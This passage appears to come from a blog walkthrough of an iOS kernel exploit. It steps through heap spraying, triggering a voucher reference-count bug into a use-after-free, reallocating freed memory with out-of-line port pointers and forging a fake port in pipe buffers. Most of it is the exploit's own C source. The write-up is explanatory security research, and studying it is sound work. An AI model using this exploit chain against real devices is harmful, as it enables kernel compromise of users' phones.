<p>Next, we spray some more memory using the ports we created earlier. This can be later freed to prompt garbage collection. If you remember we had created filler ports and bumped the queue limit on the first <strong>2000</strong> ports. In this case, the first <strong>500</strong> ports are being used for spraying again.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 6\. Spray 15% of memory (400MB on the iPhone XR) in kalloc.1024 that we can free later to</span>
    	<span class="c1">// prompt gc. We'll reuse some of the early ports from the port spray above for this.</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">gc_spray_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">.</span><span class="mi">15</span> <span class="o">*</span> <span class="n">platform</span><span class="p">.</span><span class="n">memory_size</span><span class="p">;</span>
    	<span class="n">mach_port_t</span> <span class="o">*</span><span class="n">gc_ports</span> <span class="o">=</span> <span class="n">filler_ports</span><span class="p">;</span>
    	<span class="kt">size_t</span> <span class="n">gc_port_count</span> <span class="o">=</span> <span class="mi">500</span><span class="p">;</span>		<span class="c1">// Use at most 500 ports for the spray.</span>
    	<span class="n">sprayed_size</span> <span class="o">=</span> <span class="n">kalloc_spray_size</span><span class="p">(</span><span class="n">gc_ports</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc_port_count</span><span class="p">,</span> <span class="mi">768</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">gc_spray_size</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"sprayed %zu bytes to %zu ports in kalloc.%u"</span><span class="p">,</span> <span class="n">sprayed_size</span><span class="p">,</span> <span class="n">gc_port_count</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span></code></pre></figure>

<h4 id="step-7-store-a-pointer-to-the-voucher-but-release-the-reference">Step 7: Store a pointer to the voucher but release the reference</h4>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 7\. Stash a pointer to an ipc_voucher in the thread's ith_voucher field and then remove</span>
    	<span class="c1">// the added reference. That way, when we deallocate the voucher ports later, we'll be left</span>
    	<span class="c1">// with a dangling voucher pointer in ith_voucher.</span>
    	<span class="n">kr</span> <span class="o">=</span> <span class="n">thread_set_mach_voucher</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="n">uaf_voucher_port</span><span class="p">);</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">kr</span> <span class="o">==</span> <span class="n">KERN_SUCCESS</span><span class="p">);</span>
    	<span class="n">voucher_release</span><span class="p">(</span><span class="n">uaf_voucher_port</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"stashed voucher pointer in thread"</span><span class="p">);</span>	</code></pre></figure>

<p>The reference is then released by the <strong>voucher_release</strong> function. Actually, @_bazad created two similar functions for releasing a reference (<strong>voucher_release</strong>) and leaking a reference (<strong>voucher_reference</strong>) which are both wrappers over <strong>voucher_tweak_references</strong> which is a wrapper over <strong>task_swap_mach_voucher</strong>. As you remember, the vulnerability was in calling the function <strong>task_swap_mach_voucher()</strong> which takes as input the current task, a new voucher (reference will be released) and and old voucher (reference will be leaked). Hence if you want to release a reference for a voucher, just pass it as an argument instead of the new voucher and the old voucher can be set as <strong>MACH_PORT_NULL</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     * voucher_reference
     *
     * Description:
     * 	Add a reference to the voucher represented by the voucher port.
     */</span>
    <span class="k">static</span> <span class="kt">void</span>
    <span class="nf">voucher_reference</span><span class="p">(</span><span class="n">mach_port_t</span> <span class="n">voucher</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">voucher_tweak_references</span><span class="p">(</span><span class="n">MACH_PORT_NULL</span><span class="p">,</span> <span class="n">voucher</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/*
     * voucher_release
     *
     * Description:
     * 	Release a reference on the voucher represented by the voucher port.
     */</span>
    <span class="k">static</span> <span class="kt">void</span>
    <span class="nf">voucher_release</span><span class="p">(</span><span class="n">mach_port_t</span> <span class="n">voucher</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">voucher_tweak_references</span><span class="p">(</span><span class="n">voucher</span><span class="p">,</span> <span class="n">MACH_PORT_NULL</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/*
     * voucher_tweak_references
     *
     * Description:
     * 	Use the task_swap_mach_voucher() vulnerabilities to modify the reference counts of 2
     * 	vouchers.
     */</span>
    <span class="k">static</span> <span class="kt">void</span>
    <span class="nf">voucher_tweak_references</span><span class="p">(</span><span class="n">mach_port_t</span> <span class="n">release_voucher</span><span class="p">,</span> <span class="n">mach_port_t</span> <span class="n">reference_voucher</span><span class="p">)</span> <span class="p">{</span>
    	<span class="c1">// Call task_swap_mach_voucher() to tweak the reference counts (two bugs in one!).</span>
    	<span class="n">mach_port_t</span> <span class="n">inout_voucher</span> <span class="o">=</span> <span class="n">reference_voucher</span><span class="p">;</span>
    	<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">task_swap_mach_voucher</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">release_voucher</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">inout_voucher</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"task_swap_mach_voucher"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    	<span class="p">}</span>
    	<span class="c1">// At this point we've successfully tweaked the voucher reference counts, but our port</span>
    	<span class="c1">// reference counts might be messed up because of the voucher port returned in</span>
    	<span class="c1">// inout_voucher! We need to deallocate it (it's extra anyways, since</span>
    	<span class="c1">// task_swap_mach_voucher() doesn't swallow the existing send rights).</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">==</span> <span class="n">KERN_SUCCESS</span> <span class="o">&amp;&amp;</span> <span class="n">MACH_PORT_VALID</span><span class="p">(</span><span class="n">inout_voucher</span><span class="p">))</span> <span class="p">{</span>
    		<span class="n">kr</span> <span class="o">=</span> <span class="n">mach_port_deallocate</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">inout_voucher</span><span class="p">);</span>
    		<span class="n">assert</span><span class="p">(</span><span class="n">kr</span> <span class="o">==</span> <span class="n">KERN_SUCCESS</span><span class="p">);</span>
    	<span class="p">}</span>
    <span class="p">}</span></code></pre></figure>

<h4 id="step-8-create-the-ool-ports-pattern-that-will-overlap-the-freed-voucher">Step 8: Create the OOL ports pattern that will overlap the freed voucher</h4>

<p>Now we need to create a pattern of OOL port pointers which will eventually overlap our vouchers. The author chooses the <strong>kalloc.32768</strong> zone to overlap the voucher , simply because its <strong>2<em>(BLOCK_SIZE(ipc_voucher))** or **2</em>(0x4000)</strong> and hence it will be easier to predict the offsets for the voucher. The number of port pointers are calculated based on the zone size divided by size of <strong>uint64_t</strong> which is the size of a port pointer. Then <strong>calloc</strong> call is used to initialize an array with the number of port pointers, each of size <strong>mach_port_t</strong> and then set to 0. The <strong>iterate_ipc_vouchers_via_mach_ports</strong> function is used to walk through the port pointers assuming them as vouchers and using a call back function giving out the offset of the voucher, and then setting <strong>iv_refs</strong> of the voucher to point to the base port, which you must remember from Step 2. The <strong>ool_ports[voucher_start + 1]</strong> is used because the <strong>iv_refs</strong> is at an offset <strong>0x8</strong> from the start of the voucher, and hence <strong>ool_ports[voucher_start + 1]</strong> will actually point to index <strong>0x8</strong> of the voucher. We will make the <strong>iv_refs</strong> field point to the base port, which is just before the pipe buffers. We also leave the <strong>iv_port</strong> pointer as <strong>MACH_PORT_NULL</strong> (set by calloc), so that when we can call <strong>thread_get_mach_voucher</strong> later on we get a new voucher port.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="o">/</span> <span class="mi">8</span><span class="err">\</span><span class="p">.</span> <span class="n">Create</span> <span class="n">the</span> <span class="n">OOL</span> <span class="n">ports</span> <span class="n">pattern</span> <span class="n">that</span> <span class="n">we</span> <span class="n">will</span> <span class="n">spray</span> <span class="n">to</span> <span class="n">overwrite</span> <span class="n">the</span> <span class="n">freed</span> <span class="n">voucher</span><span class="p">.</span>
    	<span class="c1">//</span>
    	<span class="c1">// We will reallocate the voucher to kalloc.32768, which is a convenient size since it lets</span>
    	<span class="c1">// us very easily predict what offsets in the allocation correspond to which fields of the</span>
    	<span class="c1">// voucher.</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_voucher</span><span class="p">)</span> <span class="o">==</span> <span class="mi">16384</span><span class="p">);</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">ool_port_spray_kalloc_zone</span> <span class="o">=</span> <span class="mi">32768</span><span class="p">;</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">ool_port_count</span> <span class="o">=</span> <span class="n">ool_port_spray_kalloc_zone</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span>
    	<span class="n">mach_port_t</span> <span class="o">*</span><span class="n">ool_ports</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">ool_port_count</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mach_port_t</span><span class="p">));</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">ool_ports</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">);</span>
    	<span class="c1">// Now, walk though and initialize the "vouchers" in the ool_ports array.</span>
    	<span class="n">iterate_ipc_vouchers_via_mach_ports</span><span class="p">(</span><span class="n">ool_port_count</span><span class="p">,</span> <span class="o">^</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">voucher_start</span><span class="p">)</span> <span class="p">{</span>
    		<span class="c1">// Send an OOL port one pointer past the start of the voucher. This will cause the</span>
    		<span class="c1">// port pointer to overlap the voucher's iv_refs field, allowing us to use the</span>
    		<span class="c1">// voucher port we'll get from thread_get_mach_voucher() later without panicking.</span>
    		<span class="c1">// This port plays double-duty since we'll later use the reference count bug again</span>
    		<span class="c1">// to increment the refcount/port pointer to point into our pipe buffer spray,</span>
    		<span class="c1">// giving us a fake port.</span>
    		<span class="n">ool_ports</span><span class="p">[</span><span class="n">voucher_start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">base_port</span><span class="p">;</span>
    		<span class="c1">// Leave the voucher's iv_port field (index 7) as MACH_PORT_NULL, so that we can</span>
    		<span class="c1">// call thread_get_mach_voucher() to get a new voucher port that references this</span>
    		<span class="c1">// voucher. This is what allows us to manipulate the reference count later to</span>
    		<span class="c1">// change the OOL port set above.</span>
    	<span class="p">});</span></code></pre></figure>

<h4 id="step-9-free-the-first-gc-spray">Step 9: Free the first GC Spray</h4>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="o">/</span> <span class="mi">9</span><span class="err">\</span><span class="p">.</span> <span class="n">Free</span> <span class="n">the</span> <span class="n">first</span> <span class="n">GC</span> <span class="n">spray</span><span class="p">.</span> <span class="n">This</span> <span class="n">makes</span> <span class="n">that</span> <span class="n">memory</span> <span class="n">available</span> <span class="k">for</span> <span class="n">zone</span> <span class="n">garbage</span> <span class="n">collection</span>
    	<span class="c1">// in the loop below.</span>
    	<span class="n">destroy_ports</span><span class="p">(</span><span class="n">gc_ports</span><span class="p">,</span> <span class="n">gc_port_count</span><span class="p">);</span></code></pre></figure>

<h4 id="step-10-release-the-vouchers-created-earlier-thereby-leaving-a-dangling-port">Step 10: Release the Vouchers created earlier thereby leaving a dangling port</h4>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 10\. Free the vouchers we created earlier. This leaves a voucher pointer dangling in our</span>
    	<span class="c1">// thread's ith_voucher field. The voucher ports we created earlier are all now invalid.</span>
    	<span class="c1">//</span>
    	<span class="c1">// The voucher objects themselves have all been overwritten with 0xdeadbeefdeadbeef. If we</span>
    	<span class="c1">// call thread_get_mach_voucher() here, we'll get an "os_refcnt: overflow" panic, and if we</span>
    	<span class="c1">// call thread_set_mach_voucher() to clear it, we'll get an "a freed zone element has been</span>
    	<span class="c1">// modified in zone ipc vouchers" panic.</span>
    	<span class="n">voucher_spray_free</span><span class="p">(</span><span class="n">voucher_ports</span><span class="p">,</span> <span class="n">voucher_spray_count</span><span class="p">);</span></code></pre></figure>

<h4 id="step-11-release-the-vouchers-to-overlap-with-the-port-pointers">Step 11: Release the Vouchers to overlap with the port pointers</h4>

<p>If you remember from Step 6, we used 500 (<strong>gc_port_count</strong>) of the <strong>2000</strong> ports that we had bumped the queue limit to already for spraying. So now we will spray the other ports until we hit the total spray size as <strong>17%</strong> of our platform size. The <strong>ool_holding_ports</strong> pointer is taken from index 500 (<strong>gc_port_count</strong>) onwards since we already used the first <strong>500</strong> for spraying. The idea is to also keep allocation size as <strong>32768</strong> so that it lands in the <strong>kalloc.32768</strong> zone, this is done by keeping the number of port pointers for each message (<strong>ool_port_count = ool_port_spray_kalloc_zone / sizeof(uint64_t</strong>), where <strong>ool_port_spray_kalloc_zone = 32768</strong>), and hopefully after this the memory freed earlier from the vouchers will be reallocated here.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 11\. Reallocate the freed voucher with the OOL port pattern created earlier in the</span>
    	<span class="c1">// kalloc.32768 zone. We need to do this slowly in order to force a zone garbage</span>
    	<span class="c1">// collection. Spraying 17% of memory (450 MB on the iPhone XR) with OOL ports should be</span>
    	<span class="c1">// plenty.</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">ool_ports_spray_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">.</span><span class="mi">17</span> <span class="o">*</span> <span class="n">platform</span><span class="p">.</span><span class="n">memory_size</span><span class="p">;</span>
    	<span class="n">mach_port_t</span> <span class="o">*</span><span class="n">ool_holding_ports</span> <span class="o">=</span> <span class="n">gc_ports</span> <span class="o">+</span> <span class="n">gc_port_count</span><span class="p">;</span>
    	<span class="kt">size_t</span> <span class="n">ool_holding_port_count</span> <span class="o">=</span> <span class="mi">500</span><span class="p">;</span>	<span class="c1">// Use at most 500 ports for the spray.</span>
    	<span class="n">sprayed_size</span> <span class="o">=</span> <span class="n">ool_ports_spray_size_with_gc</span><span class="p">(</span><span class="n">ool_holding_ports</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ool_holding_port_count</span><span class="p">,</span>
    			<span class="n">message_size_for_kalloc_size</span><span class="p">(</span><span class="mi">512</span><span class="p">),</span>
    			<span class="n">ool_ports</span><span class="p">,</span> <span class="n">ool_port_count</span><span class="p">,</span> <span class="n">MACH_MSG_TYPE_MAKE_SEND</span><span class="p">,</span>
    			<span class="n">ool_ports_spray_size</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"sprayed %zu bytes of OOL ports to %zu ports in kalloc.%zu"</span><span class="p">,</span>
    			<span class="n">sprayed_size</span><span class="p">,</span> <span class="n">ool_holding_port_count</span><span class="p">,</span> <span class="n">ool_port_spray_kalloc_zone</span><span class="p">);</span>
    	<span class="n">free</span><span class="p">(</span><span class="n">ool_ports</span><span class="p">);</span></code></pre></figure>

<p>If you look under the method <strong>ool_ports_spray_size_with_gc</strong>, there is also delay added between every <strong>2MB</strong> (<strong>gc_step</strong>) of spray with <strong>usleep()</strong> to give time for zone garbage collection.</p>

<p>Each of these ports are sprayed using mach messages with OOL port descriptors. This will allocate kernel memory and fill them with port pointers. The following code in <strong>ool_ports_spray_port</strong> is used to allocate parameters and send the message.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// Populate the message. Each OOL ports descriptor will be a kalloc.</span>
    	<span class="n">msg</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_bits</span>           <span class="o">=</span> <span class="n">MACH_MSGH_BITS_SET</span><span class="p">(</span><span class="n">MACH_MSG_TYPE_MAKE_SEND</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MACH_MSGH_BITS_COMPLEX</span><span class="p">);</span>
    	<span class="n">msg</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_remote_port</span>    <span class="o">=</span> <span class="n">holding_port</span><span class="p">;</span>
    	<span class="n">msg</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_size</span>           <span class="o">=</span> <span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)</span> <span class="n">message_size</span><span class="p">;</span>
    	<span class="n">msg</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_id</span>             <span class="o">=</span> <span class="err">'</span><span class="n">ools</span><span class="err">'</span><span class="p">;</span>
    	<span class="n">msg</span><span class="o">-&gt;</span><span class="n">body</span><span class="p">.</span><span class="n">msgh_descriptor_count</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)</span> <span class="n">ool_count</span><span class="p">;</span>
    	<span class="n">mach_msg_ool_ports_descriptor_t</span> <span class="n">ool_descriptor</span> <span class="o">=</span> <span class="p">{};</span>
    	<span class="n">ool_descriptor</span><span class="p">.</span><span class="n">type</span>             <span class="o">=</span> <span class="n">MACH_MSG_OOL_PORTS_DESCRIPTOR</span><span class="p">;</span>
    	<span class="n">ool_descriptor</span><span class="p">.</span><span class="n">address</span>          <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">ool_ports</span><span class="p">;</span>
    	<span class="n">ool_descriptor</span><span class="p">.</span><span class="n">count</span>            <span class="o">=</span> <span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)</span> <span class="n">port_count</span><span class="p">;</span>
    	<span class="n">ool_descriptor</span><span class="p">.</span><span class="n">deallocate</span>       <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
    	<span class="n">ool_descriptor</span><span class="p">.</span><span class="n">copy</span>             <span class="o">=</span> <span class="n">MACH_MSG_PHYSICAL_COPY</span><span class="p">;</span>
    	<span class="n">ool_descriptor</span><span class="p">.</span><span class="n">disposition</span>      <span class="o">=</span> <span class="n">ool_disposition</span><span class="p">;</span>
    	<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ool_count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">msg</span><span class="o">-&gt;</span><span class="n">ool_ports</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ool_descriptor</span><span class="p">;</span>
    	<span class="p">}</span>
    	<span class="c1">// Send the messages.</span>
    	<span class="kt">size_t</span> <span class="n">messages_sent</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="k">for</span> <span class="p">(;</span> <span class="n">messages_sent</span> <span class="o">&lt;</span> <span class="n">message_count</span><span class="p">;</span> <span class="n">messages_sent</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">mach_msg</span><span class="p">(</span>
    				<span class="o">&amp;</span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">,</span>
    				<span class="n">MACH_SEND_MSG</span> <span class="o">|</span> <span class="n">MACH_MSG_OPTION_NONE</span><span class="p">,</span>
    				<span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)</span> <span class="n">message_size</span><span class="p">,</span>
    				<span class="mi">0</span><span class="p">,</span>
    				<span class="n">MACH_PORT_NULL</span><span class="p">,</span>
    				<span class="n">MACH_MSG_TIMEOUT_NONE</span><span class="p">,</span>
    				<span class="n">MACH_PORT_NULL</span><span class="p">);</span>
    		<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    			<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"mach_msg"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    			<span class="k">break</span><span class="p">;</span>
    		<span class="p">}</span>
    	<span class="p">}</span></code></pre></figure>

<h4 id="step-12-call-thread_get_mach_voucher-to-get-a-voucher-port-for-the-freed-voucher">Step 12: Call thread_get_mach_voucher() to get a voucher port for the freed voucher</h4>

<p>Using <strong>thread_get_mach_voucher</strong>, we can recover the voucher port for the freed voucher, and this will allow us to further manipulate the reference count of the voucher.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    	<span class="c1">// 12\. Once we've reallocated the voucher with an OOL ports allocation, the iv_refs field</span>
    	<span class="c1">// will overlap with the lower 32 bits of the pointer to base_port. If base_port's address</span>
    	<span class="c1">// is low enough, this tricks the kernel into thinking that the reference count is valid,</span>
    	<span class="c1">// allowing us to call thread_get_mach_voucher() without panicking. And since the OOL ports</span>
    	<span class="c1">// pattern overwrote the voucher's iv_port field with MACH_PORT_NULL,</span>
    	<span class="c1">// convert_voucher_to_port() will go ahead and allocate a fresh voucher port through which</span>
    	<span class="c1">// we can manipulate our freed voucher while it still overlaps our OOL ports.</span>
    	<span class="n">kr</span> <span class="o">=</span> <span class="n">thread_get_mach_voucher</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uaf_voucher_port</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"c"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not get a voucher port to the freed voucher; reallocation failed?"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">MACH_PORT_VALID</span><span class="p">(</span><span class="n">uaf_voucher_port</span><span class="p">))</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"freed voucher port 0x%x is not valid"</span><span class="p">,</span> <span class="n">uaf_voucher_port</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"recovered voucher port 0x%x for freed voucher"</span><span class="p">,</span> <span class="n">uaf_voucher_port</span><span class="p">);</span></code></pre></figure>

<h4 id="step-13-modify-the-iv_refs-to-point-to-pipe-buffers">Step 13: Modify the iv_refs to point to pipe buffers</h4>

<p>Using the voucher port, we can modify the <strong>iv_refs</strong> value using the same vulnerability (reference leak this time) and hope that it points to our pipe buffers. If you recall from before, the <strong>iv_refs</strong> was actually pointing to the base port. So now the <strong>iv_refs</strong> pointer is incremented by <strong>4MB</strong> (<strong>base_port_to_fake_port_offset</strong>) in this case, and if you remember we sprayed about <strong>16MB</strong> of Pipe buffers, so the Port pointer should overlap somewhere within our sprayed Pipe buffers.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 13\. Alright, we've pushed through the first risky part! We now have a voucher port that</span>
    	<span class="c1">// refers to a voucher that overlaps with our OOL ports spray. Our next step is to modify</span>
    	<span class="c1">// the voucher's iv_refs field using the reference counting bugs so that the ipc_port</span>
    	<span class="c1">// pointer it overlaps with now points into our pipe buffers. That way, when we receive the</span>
    	<span class="c1">// message, we'll get a send right to a fake IPC port object whose contents we control.</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"adding references to the freed voucher to change the OOL port pointer"</span><span class="p">);</span>
    	<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">base_port_to_fake_port_offset</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">voucher_reference</span><span class="p">(</span><span class="n">uaf_voucher_port</span><span class="p">);</span>
    	<span class="p">}</span>
    	<span class="n">kr</span> <span class="o">=</span> <span class="n">thread_set_mach_voucher</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="n">MACH_PORT_NULL</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not clear thread voucher"</span><span class="p">);</span>
    		<span class="c1">// This is a horrible fix, since ith_voucher still points to the freed voucher, but</span>
    		<span class="c1">// at least it'll make the OOL port pointer correct so the exploit can continue.</span>
    		<span class="n">voucher_release</span><span class="p">(</span><span class="n">uaf_voucher_port</span><span class="p">);</span>
    	<span class="p">}</span></code></pre></figure>

<h4 id="step-14-identify-voucher-port-and-overlapping-fake-port">Step 14: Identify Voucher Port and overlapping fake port</h4>

<p>Now since the freed voucher (which is actually overlapped with port pointers) has an <strong>iv_refs</strong> pointer pointing to somewhere within the pipe buffers, we need to find out which of the <strong>1024</strong> pipe buffers is it. In order to do that, we receive the messages that we sent earlier using <strong>OOL</strong> Ports descriptor. We loop through all the descriptors in the message and pass them to a handler block with the parameter as the starting ports address and the total number of ports. Then we loop through each of these port pointers as vouchers using a helper function <strong>iterate_ipc_vouchers_via_mach_ports</strong> that gives out address of all possible vouchers by dividing the size of all port pointers by voucher size. The <strong>ool_voucher_port</strong> can be identified because it will have a valid voucher port, since we called <strong>thread_get_mach_voucher()</strong> only on that voucher, and also by checking against <strong>uaf_voucher_port</strong> at an offset of <strong>7</strong> when looping as port pointers, since its <strong>7*8</strong> which is 56 bytes (offset of <strong>iv_port</strong>) in the voucher struct. The fake port is identified simply as the value pointing to the <strong>iv_refs</strong> which is at an offset of <strong>0x8</strong> and hence index <strong>1</strong> when using port pointers.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 14\. Now receive the OOL ports and recover our voucher port and the fake port that</span>
    	<span class="c1">// overlaps our pipe buffers. This is where we're most likely to panic if the port/pipe</span>
    	<span class="c1">// groom failed and the overlapping OOL port pointer does not point into our pipe buffers.</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"receiving the OOL ports will leak port 0x%x"</span><span class="p">,</span> <span class="n">base_port</span><span class="p">);</span>
    	<span class="n">fake_port</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    	<span class="n">ool_ports_spray_receive</span><span class="p">(</span><span class="n">ool_holding_ports</span><span class="p">,</span> <span class="n">ool_holding_port_count</span><span class="p">,</span>
    			<span class="o">^</span><span class="p">(</span><span class="n">mach_port_t</span> <span class="o">*</span><span class="n">ool_ports</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">)</span> <span class="p">{</span>
    		<span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">!=</span> <span class="n">ool_port_count</span><span class="p">)</span> <span class="p">{</span>
    			<span class="n">ERROR</span><span class="p">(</span><span class="s">"unexpected OOL ports count %zu"</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
    			<span class="k">return</span><span class="p">;</span>
    		<span class="p">}</span>
    		<span class="c1">// Loop through each of the possible voucher positions in the OOL ports looking for</span>
    		<span class="c1">// a sign that this is where the voucher overlaps.</span>
    		<span class="n">iterate_ipc_vouchers_via_mach_ports</span><span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="o">^</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">voucher_start</span><span class="p">)</span> <span class="p">{</span>
    			<span class="c1">// We're checking to see whether index 7 (which was MACH_PORT_NULL when we</span>
    			<span class="c1">// sent the message) now contains a port. If it does, that means that this</span>
    			<span class="c1">// segment of the OOL ports overlapped with the freed voucher, and so when</span>
    			<span class="c1">// we called thread_get_mach_voucher() above, the iv_port field was set to</span>
    			<span class="c1">// the newly allocated voucher port (which is what we're receiving now).</span>
    			<span class="n">mach_port_t</span> <span class="n">ool_voucher_port</span> <span class="o">=</span> <span class="n">ool_ports</span><span class="p">[</span><span class="n">voucher_start</span> <span class="o">+</span> <span class="mi">7</span><span class="p">];</span>
    			<span class="k">if</span> <span class="p">(</span><span class="n">ool_voucher_port</span> <span class="o">!=</span> <span class="n">MACH_PORT_NULL</span><span class="p">)</span> <span class="p">{</span>
    				<span class="n">INFO</span><span class="p">(</span><span class="s">"received voucher port 0x%x in OOL ports"</span><span class="p">,</span> <span class="n">ool_voucher_port</span><span class="p">);</span>
    				<span class="n">INFO</span><span class="p">(</span><span class="s">"voucher overlapped at offset 0x%zx"</span><span class="p">,</span>
    						<span class="n">voucher_start</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">));</span>
